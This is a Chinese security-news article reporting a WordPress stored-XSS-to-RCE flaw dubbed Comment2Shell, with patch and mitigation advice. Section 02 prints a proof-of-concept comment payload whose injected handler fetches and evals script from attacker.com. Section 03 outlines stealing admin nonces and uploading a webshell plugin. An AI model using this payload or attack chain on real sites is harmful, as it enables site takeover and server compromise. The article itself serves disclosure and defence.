#  【安全圈】WordPress爆Comment2Shell高危漏洞：匿名评论经由管理员会话直达RCE  
 安全圈   2026-09-22 11:00  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aBHpjnrGylgOvEXHviaXu1fO2nLov9bZ055v7s8F6w1DD1I0bx2h3zaOx0Mibd5CngBwwj2nTeEbupw7xpBsx27Q/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
**关键词**  
  
  
  
漏洞  
  
  
**核心导读：**  
近日，安全研究团队 Patchstack 披露了影响全球数千万站点的 WordPress 核心严重漏洞——**Comment2Shell**  
（CVE-2026-93485，CVSS 8.8）。攻击者在不需要任何账号权限的前提下，仅需提交一条经过特殊构造的评论，即可在管理员登录后台查看评论时触发跨站脚本（Stored XSS），进而自动安装恶意插件执行任意系统命令（RCE）。目前 WordPress 官方已紧急推送 7.1.1 等安全补丁，所有站长需立即自查。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/sbq02iadgfyFuiaIfRKlLQB6RFSbibQ1hbFeXFlXApDPY4TeWqf6rePMREfL2sVqia6oIN1syfXs6ndiaa1nNHickLkZk8ZibYHiaibibGB0EePwLzpAw/640?wx_fmt=other&from=appmsg "")  
## 01 / 漏洞情报与威胁评级  
  
WordPress 作为全球市场占有率超过 40% 的开源内容管理系统，其评论系统属于默认对外开放的核心交互模块。安全厂商 Patchstack 的漏洞研究员 Rafie Muhammad 发现，WordPress 4.7 至 7.1 版本（使用全站区块主题的站点）在处理公开评论的 HTML 属性转义流程中存在致命逻辑断层。  
  
📋 漏洞核心情报档案  
  
漏洞编号  
CVE-2026-93485  
(代号: Comment2Shell)  
  
严重程度  
CVSS 8.8 HIGH  
(AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)  
  
漏洞类型  
未认证存储型 XSS 跃迁至管理员级远程代码执行 (Stored XSS to RCE)  
  
前置条件  
开启公开评论功能，且全站启用了区块主题（Block Themes / Gutenberg）  
  
影响范围  
WordPress 4.7 至 7.1 全系列分支  
  
官方修复  
WordPress 7.1.1, 7.0.1, 6.9.1 及各版本维护安全补丁  
## 02 / 漏洞机理：换行符击穿过滤边界  
  
WordPress 在入库保存评论内容时，使用经典的 wp_filter_post_kses()  
 过滤机制。该机制默认允许部分安全的 HTML 标签与属性。然而，在区块主题（Block Themes）的前端或后台渲染解析器中，评论的某些属性（如 class  
、title  
 等）在保存阶段与解析渲染阶段存在解析语义不一致。  
  
当攻击者在 HTML 属性值中故意注入未经严格规范化的**回车换行符（CRLF / Line Break）**  
时，存储阶段将其视为普通的属性文本内容并放行；但在服务端区块引擎（Gutenberg Block Parser）重组生成最终 DOM 节点时，换行符导致属性闭合引号被提前截断，从而跳出属性边界，让攻击者能够无缝拼接恶意的事件监听器与外联脚本标签：  
  
# 概念验证：突破属性闭合注入恶意脚本  
  
<blockquote class="valid-class  
  
onfocus='fetch("//attacker.com/p.js").then(r=>r.text()).then(eval)'  
  
tabindex='1'">  
  
Comment text here...  
  
</blockquote>  
  
一旦恶意评论入库，虽然对于普通访客而言可能需要交互，但在后台管理控制台（wp-admin/edit-comments.php）或带有交互特性的区块管理界面中，管理员打开该评论页面时便会全自动执行该段 JavaScript 脚本代码。  
## 03 / 完整攻击链：从匿名 XSS 跃迁至服务器 RCE  
  
为什么一个客户端存储型 XSS 漏洞被赋予了高达 8.8 的高危评级并命名为 **Comment2Shell**  
？核心在于攻击者借助当前管理员的高权限 Cookie 与 REST API 凭据，可以在后台执行一系列特权 API 链式调用：  
  
STEP 1**匿名评论投递：**  
未认证黑客向目标站点任意公开文章发送包含换行属性截断的恶意评论 Payload。  
  
STEP 2**管理员登录触发：**  
管理员日常登录后台审核或查看未决评论，浏览器渲染时隐蔽执行攻击载荷。  
  
STEP 3**窃取 Nonce 凭据：**  
恶意脚本提取页面内嵌入的 wp_rest  
 nonce 以及插件安装管理界面的 CSRF Token。  
  
STEP 4**插件上传夺权（RCE）：**  
脚本自动发起 POST 请求上传包含 Webshell 的伪造插件 ZIP，激活插件并在主机直接拿到 Web 权限 Shell。  
## 04 / 排查指引与加固修复方案  
  
由于该漏洞直接暴露于公网匿名入口，且利用门槛极低，建议各运维团队与站长立即采取以下三道防御动作：  
  
✅ 1. 立即升级 WordPress 核心版本（最彻底途径）  
  
官方已同步推送针对各个支持分支的补丁包。如果服务器环境支持 WP-CLI，可直接执行如下命令完成一键静默更新：  
  
wp core update --version=7.1.1  
  
⚡ 2. 临时缓解措施（无法立刻升级时的应急手段）  
- 在 WordPress 后台**“设置 -> 讨论”**  
中，临时取消勾选“允许他人在新文章上发表评论”  
，并关闭已有旧文章的评论开放；  
  
- 在根目录 wp-config.php  
 中添加禁止文件编辑与插件上传的严格安全加固指令：  
  
define('DISALLOW_FILE_MODS', true);  
  
define('DISALLOW_FILE_EDIT', true);  
  
🛡️ 3. WAF 规则与数据库排查  
  
在边界 WAF 上针对 /wp-comments-post.php  
 启用评论内容属性换行过滤规则，拦截包含换行符跟随 on[a-z]+=  
 或 <script  
 样式的可疑 Payload；同时查询数据库 wp_comments  
 表中未审核的评论内容排查已有潜伏风险。  
  
  
   END    
  
  
阅读推荐  
  
  
  
  
[【安全圈】朝鲜黑客渗透IT服务商：伪造Terraform锁文件结合Cursor打入macOS](https://mp.weixin.qq.com/s?__biz=MzIzMzE4NDU1OQ==&mid=2652079060&idx=1&sn=122bff70309a2d2affd517bb5faefed5&scene=21#wechat_redirect)  
  
  
  
[【安全圈】无弹窗静默RCE！OpenAI Codex 沙箱双重逃逸曝光：借助 V8 堆内存泄露与补丁越权突破宿主](https://mp.weixin.qq.com/s?__biz=MzIzMzE4NDU1OQ==&mid=2652079060&idx=2&sn=43e13a80be1d5fb3b64f67cdf03173b0&scene=21#wechat_redirect)  
  
  
  
[【安全圈】C2写进智能合约！ChainScript木马借Polygon公链不死轮换](https://mp.weixin.qq.com/s?__biz=MzIzMzE4NDU1OQ==&mid=2652079060&idx=3&sn=71d10acf189d83267151c8ccc3b8990a&scene=21#wechat_redirect)  
  
  
  
[【安全圈】用 Claude 偷家 OpenAI？白帽两跳击穿员工账号，直通私有代码库](https://mp.weixin.qq.com/s?__biz=MzIzMzE4NDU1OQ==&mid=2652079049&idx=1&sn=119b382657f5e42c4af32474b635c6f1&scene=21#wechat_redirect)  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCEft6M27yliapIdNjlcdMaZ4UR4XxnQprGlCg8NH2Hz5Oib5aPIOiaqUicDQ/640?wx_fmt=gif "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCEDQIyPYpjfp0XDaaKjeaU6YdFae1iagIvFmFb4djeiahnUy2jBnxkMbaw/640?wx_fmt=png "")  
  
**安全圈**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCEft6M27yliapIdNjlcdMaZ4UR4XxnQprGlCg8NH2Hz5Oib5aPIOiaqUicDQ/640?wx_fmt=gif "")  
  
  
←扫码关注我们  
  
**网罗圈内热点 专注网络安全**  
  
**实时资讯一手掌握！**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCE3vpzhuku5s1qibibQjHnY68iciaIGB4zYw1Zbl05GQ3H4hadeLdBpQ9wEA/640?wx_fmt=gif "")  
  
**好看你就分享 有用就点个赞**  
  
**支持「****安全圈」就点个三连吧！**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCE3vpzhuku5s1qibibQjHnY68iciaIGB4zYw1Zbl05GQ3H4hadeLdBpQ9wEA/640?wx_fmt=gif "")  
  
  
